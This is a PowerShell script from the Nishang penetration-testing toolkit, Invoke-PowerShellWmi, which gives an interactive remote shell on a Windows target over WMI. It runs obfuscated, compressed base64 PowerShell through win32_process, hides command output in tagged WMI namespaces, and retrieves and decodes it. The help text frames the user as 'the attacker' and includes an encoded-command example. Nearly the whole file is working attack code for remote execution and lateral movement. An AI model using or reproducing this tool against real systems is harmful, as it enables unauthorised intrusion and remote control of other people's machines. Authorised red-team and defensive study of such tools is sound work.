function Invoke-PowerShellWmi{
<#
.SYNOPSIS

Nishang script which can be used for interactive PowerShell over WMI. 
 
.DESCRIPTION

Executing commands using WMI does not return output. This script utilizes WMI Namespaces to temporarily store the 
output in Base64 encoded form and returns it to the attacker's machine. The Namespaces created in the process are
marked with "SYSINFOS" unless specified otherwise by the user. 

The default shell available is PowerShell but cmd.exe can be used as well. 

Make sure to use "exit" command when closing the shell as it initiates a cleanup of the target system. 

You must have Administrator priviliges/credentials for the target machine.

This script is taken from WmiSploit by Jesse Davis (@secabstraction)

.PARAMETER IPAddress

The target IP address to connect to. 

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. 
If this parameter isn't used, the credentials of the current session will be used.

.PARAMETER Namespace

The namespace to be used. Default is "root\default"

.PARAMETER Tag

The tag to be added to namespaces created by the script on a target. Default is "SYSINFOS"

.PARAMETER ShellType

The type of shell access you want on the target computer. Options are "PowerShell" or "Cmd". Default is "PowerShell"

.EXAMPLE

PS C:\> Invoke-PowerShellWmi -ComputerName domainpc -UserName bharat\domainuser

[domainpc]: > Get-Host


Name             : ConsoleHost
Version          : 3.0
--------------------------------

Above example shows executing a PowerShell cmdlet.

.EXAMPLE

PS C:\> Invoke-PowerShellWmi -ComputerName domainpc -UserName bharat\domainuser

[domainpc]: > powershell.exe -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAG
UAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBl
AGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYwAwADgAdA
AwAFEAMABvAHkAawA5AE8ATABTADcAbQA1AFEASQBBACcAKQApACkAKQAsACAAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoA
OgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=

      WS(K) VM(M)   CPU(s)     Id ProcessName
      ----- -----   ------     -- -----------
       7212   477     0.03   1716 calc
       2684    22     0.00   2960 conhost
       2944    47     0.45    320 csrss
       4232    43     0.50    368 csrss
----------------------------------------------------

Use above to execute PowerShell scripts. Use Invoke-Encode from Nishang to encode a script/command.

.NOTES

This script has been thankfully taken from WmiSploit by Jesse Davis (@secabstraction)

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-4.html
http://www.patch-tuesday.net/2015/04/wmisploit.html
https://github.com/secabstraction/WmiSploit
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias("IPAddress")]
        [String]
        $ComputerName,
    
        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $UserName = [System.Management.Automation.PSCredential]::Empty,
    
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Namespace = "root\default",
    
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Tag = "SYSINFOS",

        [Parameter(Mandatory = $False)]
        [ValidateSet('Cmd','PowerShell')]
        [String]
        $ShellType = 'PowerShell'
    )
    
    if ($ShellType -eq 'PowerShell') { $Shell = "powershell.exe -noprofile -c " }
    else { $Shell = "%comspec% /c " }

    # Start a custom prompt
    $Command = ""
    do{ 
        # Make a pretty prompt for the user to provide commands at
        Write-Host ("[" + $($ComputerName) + "]: > ") -nonewline -foregroundcolor green 
        $Command = Read-Host

        # Execute commands on remote host 
        switch ($Command) {
            "exit" { 
                Write-Verbose "Cleaning up the target system"
                Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
            }
            default { 
                Write-Verbose "Executing given command on $ComputerName"
                $RemoteScript = @"
                Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                `$WScriptShell = New-Object -c WScript.Shell
                function Insert-Piece(`$i, `$piece) {
                    `$Count = `$i.ToString()
	                `$Zeros = "0" * (6 - `$count.Length)
	                `$Tag = "$Tag" + `$Zeros + `$count
	                `$Piece = `$Tag + `$piece + `$Tag
	                Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
                }
	                `$ShellExec = `$WScriptShell.Exec("$Shell" + "$Command") 
	                `$ShellOutput = `$ShellExec.StdOut.ReadAll()
                    `$WmiEncoded = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$ShellOutput))) -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
                    `$NumberOfPieces = [Math]::Floor(`$WmiEncoded.Length / 5500)
                    if (`$WmiEncoded.Length -gt 5500) {
                        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
                        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
                        for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
	                        `$piece = `$WmiEncoded.Substring(0,5500)
		                    `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
		                    Insert-Piece `$i `$piece
                        }
                        `$WmiEncoded = `$LastPiece
                    }
	                Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
	                Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
"@
                $ScriptBlock = [scriptblock]::Create($RemoteScript)
                
                # Compress and Encode the scriptblock
                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
                $ms = New-Object IO.MemoryStream
                $action = [IO.Compression.CompressionMode]::Compress
                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $ScriptBlock | ForEach-Object {$sw.WriteLine($_)}
                $sw.Close()
                # Base64 encode stream
                $Compressed = [Convert]::ToBase64String($ms.ToArray())
                
                $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

                "`$(New-Object IO.Compression.DeflateStream (" +

                "`$(New-Object IO.MemoryStream (,"+

                "`$([Convert]::FromBase64String('$Compressed')))), " +

                "[IO.Compression.CompressionMode]::Decompress)),"+

                " [Text.Encoding]::ASCII)).ReadToEnd();"
        
                #Generate Base64 encoded command to use with the powershell -encodedcommand paramter
                $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
                $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
                #Check for max. length supported by Windows. If the base64 encoded command is longer use the other one.
                if (($EncScript.Length -gt 8190) -or ($PostScriptCommand -eq $True))
                {
                    $EncodedScript = $Command
                }
                else
                {
                    $EncodedScript = $EncScript
                }

                
                $EncodedPosh = "powershell.exe -e $EncodedScript"
                $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
                    
                # Wait for script to finish writing output to WMI namespaces
                $outputReady = ""
                do
                {
                    $outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"
                }
                until($outputReady)
                Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    
                # Retrieve cmd output written to WMI namespaces
                Write-Verbose "Retrieving command output" 
                Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
            }
        }
    }until($Command -eq "exit")
}
function Get-WmiShellOutput
{

    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ComputerName,
    
        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $UserName = [System.Management.Automation.PSCredential]::Empty,
    
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Namespace = "root\default",
    
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Tag
    ) 
	
	$GetOutput = @() 
	$GetOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                    -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
	
	if ([BOOL]$GetOutput.Length) 
    {
		
	    $Reconstructed = New-Object System.Text.StringBuilder

        #Decode Base64 output
		foreach ($line in $GetOutput) 
        {
			$WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
            $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
	        $null = $Reconstructed.Append($WmiToBase64)
        }
        if ($Reconstructed.ToString().Length % 4 -ne 0) 
        { 
            $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) 
        }
        $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Reconstructed.ToString()))
        Write-Output $Decoded
    }	
    #Decode single line Base64
	else 
    { 
		$GetOutput
        $GetString = $GetOutput.Name
		$WmiToBase64 = $GetString.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		if ($WmiToBase64.length % 4 -ne 0) 
        { 
            $WmiToBase64 += ("===").Substring(0,4 - ($WmiToBase64.Length % 4)) 
        }
        $DecodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($WmiToBase64))
		Write-Output $DecodedOutput    
    }
}